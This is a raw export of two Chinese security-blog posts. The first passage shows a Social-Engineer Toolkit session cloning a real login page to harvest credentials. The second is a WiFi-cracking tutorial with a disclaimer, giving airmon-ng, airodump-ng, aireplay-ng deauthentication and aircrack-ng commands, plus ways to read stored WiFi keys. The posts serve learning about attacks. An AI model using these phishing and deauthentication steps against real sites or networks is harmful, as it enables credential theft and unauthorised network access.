MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMss<span class="string">''</span><span class="string">'                          '</span><span class="string">''</span>ssMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMyy<span class="string">''</span>                                    <span class="string">''</span>yyMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMyy<span class="string">''</span>                                            <span class="string">''</span>yyMMMMMMMM   XX</span><br><span class="line">XX   MMMMMy<span class="string">''</span>                                                    <span class="string">''</span>yMMMMM   XX</span><br><span class="line">XX   MMMy<span class="string">'                                                          '</span>yMMM   XX</span><br><span class="line">XX   Mh<span class="string">'                                                              '</span>hM   XX</span><br><span class="line">XX   -                                                                  -   XX</span><br><span class="line">XX                                                                          XX</span><br><span class="line">XX   ::                                                                ::   XX</span><br><span class="line">XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX</span><br><span class="line">XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX</span><br><span class="line">XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX</span><br><span class="line">XX   MMMMMM MMmm<span class="string">''</span>      <span class="string">'mmMMMMMMMMyy.  .yyMMMMMMMMmm'</span>      <span class="string">''</span>mmMM MMMMMM   XX</span><br><span class="line">XX   ---mMM <span class="string">''</span>             <span class="string">'mmMMMMMMMM  MMMMMMMMmm'</span>             <span class="string">''</span> MMm---   XX</span><br><span class="line">XX   yyyym<span class="string">'    .              '</span>mMMMMm<span class="string">'  '</span>mMMMMm<span class="string">'              .    '</span>myyyy   XX</span><br><span class="line">XX   mm<span class="string">''</span>    .y<span class="string">'     ..yyyyy..  '</span><span class="string">''</span><span class="string">'      '</span><span class="string">''</span><span class="string">'  ..yyyyy..     '</span>y.    <span class="string">''</span>mm   XX</span><br><span class="line">XX           <span class="keyword">MN</span>    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX</span><br><span class="line">XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX</span><br><span class="line">XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX</span><br><span class="line">XX              o+++     ++++Mo    M      M    oM++++     +++o              XX</span><br><span class="line">XX                                oo      oo                                XX</span><br><span class="line">XX           oM                 oo          oo                 Mo           XX</span><br><span class="line">XX         oMMo                M              M                oMMo         XX</span><br><span class="line">XX       +MMMM                 s              s                 MMMM+       XX</span><br><span class="line">XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX</span><br><span class="line">XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX</span><br><span class="line">XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX</span><br><span class="line">XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX</span><br><span class="line">XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX</span><br><span class="line">XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX</span><br><span class="line">XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX</span><br><span class="line">XX   MMMMd   <span class="string">''</span><span class="string">''</span>hhhhh       odddo          obbbo        hhhh<span class="string">''</span><span class="string">''</span>   dMMMM   XX</span><br><span class="line">XX   MMMMMd             <span class="string">'hMMMMMMMMMMddddddMMMMMMMMMMh'</span>             dMMMMM   XX</span><br><span class="line">XX   MMMMMMd              <span class="string">'hMMMMMMMMMMMMMMMMMMMMMMh'</span>              dMMMMMM   XX</span><br><span class="line">XX   MMMMMMM-               <span class="string">''</span>ddMMMMMMMMMMMMMMdd<span class="string">''</span>               -MMMMMMM   XX</span><br><span class="line">XX   MMMMMMMM                   <span class="string">'::dddddddd::'</span>                   MMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMM-                                                  -MMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMM                                                  MMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMy                                                yMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX                                                                          XX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">    .o88o.                               o8o                .</span><br><span class="line">    <span class="number">888</span> `<span class="string">"                               `"</span><span class="string">'              .o8</span></span><br><span class="line"><span class="string">   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo</span></span><br><span class="line"><span class="string">    888    d88(  "8 d88'</span> `<span class="number">88</span>b d<span class="number">88</span><span class="string">' `"Y8 `888  d88'</span> `<span class="number">88</span>b   <span class="number">888</span>    `<span class="number">88</span>.  <span class="number">.8</span><span class="string">'</span></span><br><span class="line"><span class="string">    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'</span></span><br><span class="line">    <span class="number">888</span>    o.  )<span class="number">88</span>b <span class="number">888</span>   <span class="number">888</span> <span class="number">888</span>   .o<span class="number">8</span>  <span class="number">888</span>  <span class="number">888</span>    .o   <span class="number">888</span> .    `<span class="number">888</span><span class="string">'</span></span><br><span class="line"><span class="string">   o888o   8""888P'</span> `Y8bod8P<span class="string">' `Y8bod8P'</span> o888o `Y8bod8P<span class="string">'   "888"      d8'</span></span><br><span class="line">                                                                .o...<span class="keyword">P</span><span class="string">'</span></span><br><span class="line"><span class="string">                                                                `XER0'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[---]        The Social-Engineer Toolkit (SET)         [---]</span><br><span class="line">[---]        Created by: David Kennedy (ReL1K)         [---]</span><br><span class="line">                      Version: <span class="number">7</span><span class="number">.7</span><span class="number">.9</span></span><br><span class="line">                   Codename: <span class="string">'Blackout'</span></span><br><span class="line">[---]        Follow us on Twitter: @TrustedSec         [---]</span><br><span class="line">[---]        Follow me on Twitter: @HackingDave        [---]</span><br><span class="line">[---]       Homepage: https:<span class="comment">//www.trustedsec.com       [---]</span></span><br><span class="line"><span class="comment">        Welcome to the Social-Engineer Toolkit (SET).</span></span><br><span class="line"><span class="comment">         The one stop shop for all of your SE needs.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     Join us on irc.freenode.net in channel #setoolkit</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The Social-Engineer Toolkit is a product of TrustedSec.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           Visit: https://www.trustedsec.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   It's easy to update using the PenTesters Framework! (PTF)</span></span><br><span class="line"><span class="comment">Visit https://github.com/trustedsec/ptf to update all your tools!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> Select from the menu:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   1) Spear-Phishing Attack Vectors</span></span><br><span class="line"><span class="comment">   2) Website Attack Vectors</span></span><br><span class="line"><span class="comment">   3) Infectious Media Generator</span></span><br><span class="line"><span class="comment">   4) Create a Payload and Listener</span></span><br><span class="line"><span class="comment">   5) Mass Mailer Attack</span></span><br><span class="line"><span class="comment">   6) Arduino-Based Attack Vector</span></span><br><span class="line"><span class="comment">   7) Wireless Access Point Attack Vector</span></span><br><span class="line"><span class="comment">   8) QRCode Generator Attack Vector</span></span><br><span class="line"><span class="comment">   9) Powershell Attack Vectors</span></span><br><span class="line"><span class="comment">  10) SMS Spoofing Attack Vector</span></span><br><span class="line"><span class="comment">  11) Third Party Modules</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  99) Return back to the main menu.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">set&gt; 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Java Applet Attack method will spoof a Java Certificate and deliver a metasploit based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if its too slow/fast.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Multi-Attack method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The HTA Attack method will allow you to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   1) Java Applet Attack Method</span></span><br><span class="line"><span class="comment">   2) Metasploit Browser Exploit Method</span></span><br><span class="line"><span class="comment">   3) Credential Harvester Attack Method</span></span><br><span class="line"><span class="comment">   4) Tabnabbing Attack Method</span></span><br><span class="line"><span class="comment">   5) Web Jacking Attack Method</span></span><br><span class="line"><span class="comment">   6) Multi-Attack Web Method</span></span><br><span class="line"><span class="comment">   7) Full Screen Attack Method</span></span><br><span class="line"><span class="comment">   8) HTA Attack Method</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  99) Return to Main Menu</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">set:webattack&gt;3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> The first method will allow SET to import a list of pre-defined web</span></span><br><span class="line"><span class="comment"> applications that it can utilize within the attack.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> The second method will completely clone a website of your choosing</span></span><br><span class="line"><span class="comment"> and allow you to utilize the attack vectors within the completely</span></span><br><span class="line"><span class="comment"> same web application you were attempting to clone.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> The third method allows you to import your own website, note that you</span></span><br><span class="line"><span class="comment"> should only have an index.html when using the import website</span></span><br><span class="line"><span class="comment"> functionality.</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   1) Web Templates</span></span><br><span class="line"><span class="comment">   2) Site Cloner</span></span><br><span class="line"><span class="comment">   3) Custom Import</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  99) Return to Webattack Menu</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">set:webattack&gt;2</span></span><br><span class="line"><span class="comment">[-] Credential harvester will allow you to utilize the clone capabilities within SET</span></span><br><span class="line"><span class="comment">[-] to harvest credentials or parameters from a website as well as place them into a report</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The way that this works is by cloning a site and looking for form fields to</span></span><br><span class="line"><span class="comment">rewrite. If the POST fields are not usual methods for posting forms this </span></span><br><span class="line"><span class="comment">could fail. If it does, you can always save the HTML, rewrite the forms to</span></span><br><span class="line"><span class="comment">be standard forms and use the "IMPORT" feature. Additionally, really </span></span><br><span class="line"><span class="comment">important:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL</span></span><br><span class="line"><span class="comment">IP address below, not your NAT address. Additionally, if you don't know</span></span><br><span class="line"><span class="comment">basic networking concepts, and you have a private IP address, you will</span></span><br><span class="line"><span class="comment">need to do port forwarding to your NAT IP address from your external IP</span></span><br><span class="line"><span class="comment">address. A browser doesns't know how to communicate with a private IP</span></span><br><span class="line"><span class="comment">address, so if you don't specify an external IP address if you are using</span></span><br><span class="line"><span class="comment">this from an external perpective, it will not work. This isn't a SET issue</span></span><br><span class="line"><span class="comment">this is how networking works.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">set:webattack&gt; IP address for the POST back in Harvester/Tabnabbing [192.168.31.103]:</span></span><br><span class="line"><span class="comment">[-] SET supports both HTTP and HTTPS</span></span><br><span class="line"><span class="comment">[-] Example: http://www.thisisafakesite.com</span></span><br><span class="line"><span class="comment">set:webattack&gt; Enter the url to clone:https://passport.csdn.net/login</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[*] Cloning the website: https://passport.csdn.net/login</span></span><br><span class="line"><span class="comment">[*] This could take a little bit...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The best way to use this attack is if username and password form</span></span><br><span class="line"><span class="comment">fields are available. Regardless, this captures all POSTs on a website.</span></span><br><span class="line"><span class="comment">[*] You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.</span></span><br><span class="line"><span class="comment">Press &#123;return&#125; if you understand what we're saying here.</span></span><br><span class="line"><span class="comment">[*] The Social-Engineer Toolkit Credential Harvester Attack</span></span><br><span class="line"><span class="comment">[*] Credential Harvester is running on port 80</span></span><br><span class="line"><span class="comment">[*] Information will be displayed to you as it arrives below:</span></span><br><span class="line"><span class="comment">directory traversal attempt detected from: 192.168.31.103</span></span><br><span class="line"><span class="comment">192.168.31.103 - - [14/Dec/2018 19:08:55] "GET /api/v4/search/preset_words HTTP/1.1" 404 -</span></span><br><span class="line"><span class="comment">192.168.31.103 - - [14/Dec/2018 19:08:58] "GET / HTTP/1.1" 200 -</span></span><br></pre></td></tr></table></figure><center>------------------------------------------分割线------------------------------------------</center><p>有点累了，后面的内容日后有时间再来更新吧。</p><div style="text-align: right">2018-12-14,By Zero</div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;已经有两个多月没有记录了，最近一直在忙于复习408、线代，还有kaggle的学习，原本打算暂时不再更新文章的，但是最近收到不少了类似像教务处
      
    
    </summary>
    
      <category term="白帽子" scheme="muzimz.cn/categories/%E7%99%BD%E5%B8%BD%E5%AD%90/"/>
    
    
      <category term="Kali" scheme="muzimz.cn/tags/Kali/"/>
    
      <category term="setoolkit" scheme="muzimz.cn/tags/setoolkit/"/>
    
      <category term="exploit" scheme="muzimz.cn/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>WIFI破解</title>
    <link href="muzimz.cn/2018/10/12/WIFI%E7%A0%B4%E8%A7%A3/"/>
    <id>muzimz.cn/2018/10/12/WIFI破解/</id>
    <published>2018-10-12T11:47:07.000Z</published>
    <updated>2019-02-02T16:36:07.793Z</updated>
    
    <content type="html"><![CDATA[<h2 id="免责申明"><a href="#免责申明" class="headerlink" title="免责申明"></a>免责申明</h2><p>正如<a href="https://book.douban.com/subject/10433737/" target="_blank" rel="noopener">《Metasploit渗透测试指南》</a>一书所述：</p><ul><li>不要进行恶意的攻击</li><li>不要做傻事</li><li>在没有获得书面授权时，不要攻击任何目标</li><li>考虑你的行为将会带来的后果</li><li>如果你干了些非法的事情，天网恢恢疏而不漏，你总会被抓到牢里的</li></ul><font color="red">任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文仅供学习，切勿用于非法操作，一切后果由使用者本人负责。</font><p><img src="http://ww4.sinaimg.cn/bmiddle/006APoFYjw1fa506lcjg8j30b40b4aat.jpg" width="300"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前，无论是在家，还是在校，亦或是各种商场，无线wifi都是星罗棋布。但你是否注意到，像CMCC、ChinaNet，亦或是其他一些表面上看上去比较信得过的wifi名（BSSID）很是常见，尤其是在人流量高、人口密度大的区域。此时的你或许会感到疑惑，但是当你看见Free字样再加上你目前对wifi的需求，一时昏了头的你可能就管不了那么多了（管他三七二十一，连上再说，Free的wifi不要白不要，我傻啊！！！）。令你始料未及的是一旦当你client那些钓鱼wifi之后，你的手机内的一切的一切的信息都在对方的掌控之中，比如说照片、通讯录、各种应用密码等，我们换句话说，你的手机在这一瞬间就相当于有了第二个主人。</p><p>综上，在这鱼龙混杂的万千世界中了解一些网络安全的知识对于每个人来说都是有必要的。本文主要介绍无线渗透中的关于wifi破解一些常用方法以此加强您的自我防护意识。</p><hr><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><ul><li>系统：<a href="https://www.kali.org/" target="_blank" rel="noopener">Kali Linux</a><br>可在其官网了解相关信息及下载iso镜像文件。</li><li>USB无线网卡<br>笔电内置的无线网卡不可用于Kali Linux的无线学习，我们需要购买一个外置的USB无线网卡，可根据自己的需要在<a href="https://www.taobao.com/" target="_blank" rel="noopener">某宝</a>进行购买。本文使用的是RT3070，购买链接是：<a href="https://item.taobao.com/item.htm?spm=a230r.1.14.67.72537d6elT6GLa&amp;id=576808272403&amp;ns=1&amp;abbucket=13#detail" target="_blank" rel="noopener">https://item.taobao.com/item.htm?spm=a230r.1.14.67.72537d6elT6GLa&amp;id=576808272403&amp;ns=1&amp;abbucket=13#detail</a></li></ul><h3 id="Kali安装及基本配置"><a href="#Kali安装及基本配置" class="headerlink" title="Kali安装及基本配置"></a>Kali安装及基本配置</h3><h4 id="Kali安装"><a href="#Kali安装" class="headerlink" title="Kali安装"></a>Kali安装</h4><p>目前主要使用的渗透工具主要有两种，一个是Backtrack，另一个是Kali，两者在使用上来讲并无差别，在本文中使用的是Kali Linux系统。</p><p>Kali官网及下载地址：<a href="https://www.kali.org/" target="_blank" rel="noopener">https://www.kali.org/</a></p><p>在官网下载好Kali Linux iso镜像文件之后，我们需要将其进行安装，一般有U盘安装、虚拟机安装、双系统等方式。本文只介绍VMware虚拟机中安装Kali的方式，有其他需要的朋友可自行查找相关资料。</p><p>Kali的安装总的来说和Ubuntu的安装并无一二，安装kali可暂且移步：<a href="https://jacklxj.github.io/2018/09/23/Xshell%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux%E5%B9%B6%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AEipython%E6%9C%8D%E5%8A%A1/" target="_blank" rel="noopener">Xshell远程连接linux并远程访问Jupyter notebook服务（深度学习环境的搭建）</a>，如下所示部分：<br><img src="http://pjq6e477y.bkt.clouddn.com/1.jpg" width="400"></p><p>在这里值得一说的是，在Kali安装的最后一步中，会有两个选择，一个是<code>手动输入设备</code>，另一个是<code>/dev/sda</code>，在这里我们务必选择<code>/dev/sda</code>，选择之后待其自动重启即可使用。</p><h4 id="Kali的基本配置"><a href="#Kali的基本配置" class="headerlink" title="Kali的基本配置"></a>Kali的基本配置</h4><blockquote><p>该部分内容以后有时间单独成文记录。</p></blockquote><h3 id="Fluxion安装"><a href="#Fluxion安装" class="headerlink" title="Fluxion安装"></a>Fluxion安装</h3><p>Fluxion的官方部分说明如下：</p><blockquote><p>Fluxion is a security auditing and social-engineering research tool. It is a remake of linset by vk496 with (hopefully) fewer bugs and more functionality. The script attempts to retrieve the WPA/WPA2 key from a target access point by means of a social engineering (phishing) attack. It’s compatible with the latest release of Kali (rolling). Fluxion’s attacks’ setup is mostly manual, but experimental auto-mode handles some of the attacks’ setup parameters. Read the FAQ before requesting issues.</p></blockquote><p>总的来说，Fluxion不同于一般的暴力wifi破解，它是通过社会工程学来获取WPA2秘钥。</p><p>Github地址：<a href="https://github.com/wi-fi-analyzer/fluxion.git" target="_blank" rel="noopener">https://github.com/wi-fi-analyzer/fluxion.git</a><br>官网地址：<a href="https://fluxionnetwork.github.io/fluxion/" target="_blank" rel="noopener">https://fluxionnetwork.github.io/fluxion/</a></p><p>在安装Kali Linux之后，虽然其就像Anaconda一样集成了大量的工具，但是默认是没有对Fluxion进行安装的，所以需要我们自行安装，此处安装使用git即可，命令如下：<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/wi-fi-analyzer/fluxion.git</span><br></pre></td></tr></table></figure></p><p>不到一杯茶的功夫即可完成该下载过程。<br><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=1504001096,2238756502&fm=26&gp=0.jpg"></p><hr><h2 id="WIFI破解"><a href="#WIFI破解" class="headerlink" title="WIFI破解"></a>WIFI破解</h2><h3 id="万能钥匙获取wifi秘钥"><a href="#万能钥匙获取wifi秘钥" class="headerlink" title="万能钥匙获取wifi秘钥"></a>万能钥匙获取wifi秘钥</h3><p>在wifi破解中，相信大家接触最多的就是万能钥匙了，但是只限连接部分的查询结果wifi，而且连接成功后绝大部分人并不知道连接的wifi密码，所以先从万能钥匙说起，由于万能钥匙不是本文的重点，所以在这只蜻蜓点水般介绍即可。</p><p>在连接万能钥匙之后，我们可以通过以下三种方式来获取秘钥。</p><ul><li>RE获取<br>进入RE管理器（手机默认文件管理器），打开<code>/data/misc/wpa_supplicant.conf</code>文件可见<code>psk</code>字段，即wifi明文秘钥。（操作前提需要ROOT）</li><li>微信获取<br>打开手机并进入无线wlan界面，点击你使用万能钥匙连接的wifi可见一个二维码，保存该二维码之后可使用微信进行扫描，扫描结果可见此wifi明文秘钥。</li><li>电脑获取<br>在终端使用如下命令可见秘钥<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show<span class="built_in"> profile </span>name=[wifi名] <span class="attribute">key</span>=<span class="string">"clear"</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="Kali暴力破解"><a href="#Kali暴力破解" class="headerlink" title="Kali暴力破解"></a>Kali暴力破解</h3><h4 id="airmon-ng监听"><a href="#airmon-ng监听" class="headerlink" title="airmon-ng监听"></a><a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank" rel="noopener">airmon-ng</a>监听</h4><p>插上USB无线网卡之后，我们将需要该网卡连接至Kali Linux系统中才能正常侦测到周围wifi，可根据<code>虚拟机 -&gt; 可移动设备 -&gt; USB连接</code>进行操作，如下图所示（这张图不太好截，手机拍的，根据图片操作即可）：<br><img src="/uploads/wifi破解/2.jpg" width="400"></p><p>之后，我们需要确认是否已经网卡的引入，可通过如下命令进行操作：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ifconfig -a</span></span><br></pre></td></tr></table></figure></p><p>输出结果如下：<br><img src="http://pjq6e477y.bkt.clouddn.com/3.jpg" width="400"></p><p>若命令输出<code>wlan0</code>网卡，则说明已经映射成功，之后我们即可启动该网卡来进一步的进行侦测周围wifi，启动如下可根据如下命令进行（三部曲）：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭network-manager服务，已避免对网卡造成不必要的影响</span></span><br><span class="line">service network-manager stop </span><br><span class="line"><span class="comment"># 我们在使用暴力破解wifi时，会使用到airmon-ng，该命令可将对airmon-ng产生影响的进程kill掉</span></span><br><span class="line">airmon-ng check kill </span><br><span class="line"><span class="comment"># 启动wlan0网卡，处于监听（monitor）状态</span></span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure></p><p><img src="http://pjq6e477y.bkt.clouddn.com/5.jpg" width="400"></p><p>补充：</p><blockquote><p>查看影响<code>airmon-ng</code>使用的进程：<code>airmon-ng check</code><br>关闭监听（monitor）状态：<code>airmon-ng stop wlan0mon</code><br>重启<code>network-manager</code>服务：service network-manager restart<br>当无线网卡无法继续监听时，可尝试一下操作（重启）：</p><ol><li>ifconfig wlan0mon down</li><li>ifconfig wlan0mon up</li></ol></blockquote><h4 id="airodump-ng-探测"><a href="#airodump-ng-探测" class="headerlink" title="airodump-ng 探测"></a><a href="http://www.aircrack-ng.org/doku.php?id=airodump-ng" target="_blank" rel="noopener">airodump-ng</a> 探测</h4><p>在使用USB无线网卡监听之后，我们就能对周围的wifi进行探测了，该过程可以探测到包含了wifi的详细信息：BSSID、ESSID、信道等，对周围所有的wifi进行探测的命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure></p><p>命令执行结果如下图所示：<br><img src="http://pjq6e477y.bkt.clouddn.com/6.jpg" width="400"></p><p>结果分析：</p><blockquote><p>BSSID：<code>Service Set Identifier</code>，站点的MAC地址，用于区分不同的网络，可理解为路由器的身份证<br>PWR：可理解为信号强度的体现，绝对值越小信号越强<br>Beacons：连接该wifi（AP）所发出的通告编号，每个接入点（AP）在最低速率（1M）时差不多每秒会发送10个左右的beacon，所以它们能在很远的地方就被发现。<br>#Data：数据传输量<br>#/s：过去10秒钟内每秒捕获数据分组的数量。<br>CH：信道<br>MB：AP的最大传输速率<br>ENC：加密方式<br>CIPHER：检测到的加密算法。这个不是特别懂。<br>AUTH：认证协议<br>ESSID：侦测到的wifi名</p></blockquote><p>更多详尽的专业解释可见：<a href="https://wenku.baidu.com/view/1907172e7375a417866f8f30.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/1907172e7375a417866f8f30.html</a></p><p>当你执行如上命令之后，的确可以侦测到附近所有的wifi接入点，但是我们确定了破解的wifi目标之后，我们需要对结果进行一些特定的限制（筛选）以便更为方便的分析，指定探测命令如下：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon --bssid <span class="string">[目标MAC地址]</span> -c <span class="string">[频道]</span> -w <span class="string">[抓包结果的文件名]</span></span><br></pre></td></tr></table></figure></p><p>其中<code>STATION</code>表示目前连接该wifi下的设备的MAC地址</p><h4 id="aireplay-ng抓包"><a href="#aireplay-ng抓包" class="headerlink" title="aireplay-ng抓包"></a><a href="http://www.aircrack-ng.org/doku.php?id=aireplay-ng" target="_blank" rel="noopener">aireplay-ng</a>抓包</h4><p>对指定wifi进行探测之后，有时我们并不会主动对该wifi进行抓包操作，原因是在我们使用<code>airodump</code>的时候，原设备就已经连接到我们的目标wifi了，此时要想抓包，我们需要使用到<code>aireplay-ng</code>来对目标设备进行强制断开连接，待其自动连接之后我们也就抓到包了，命令如下：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a <span class="string">[接入点MAC地址]</span> -c <span class="string">[客户端接入地址]</span> wlan0mon</span><br></pre></td></tr></table></figure></p><p>执行结果如下：<br><img src="http://pjq6e477y.bkt.clouddn.com/7.jpg" width="400"></p><p><img src="http://pjq6e477y.bkt.clouddn.com/8.jpg" width="400"></p><blockquote><p>解释：上述的包与爬虫抓包类似，可以简单的理解为含有我们需要重要信息的文件。</p></blockquote><h4 id="aircrack-ng-破解"><a href="#aircrack-ng-破解" class="headerlink" title="aircrack-ng 破解"></a><a href="http://www.aircrack-ng.org/doku.php?id=aircrack-ng" target="_blank" rel="noopener">aircrack-ng</a> 破解</h4><p>通过上述操作，我们已经成功抓包了，通过以下命令来查看抓包文件:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/root</span> &amp;&amp; <span class="keyword">ls</span></span><br></pre></td></tr></table></figure></p><p><img 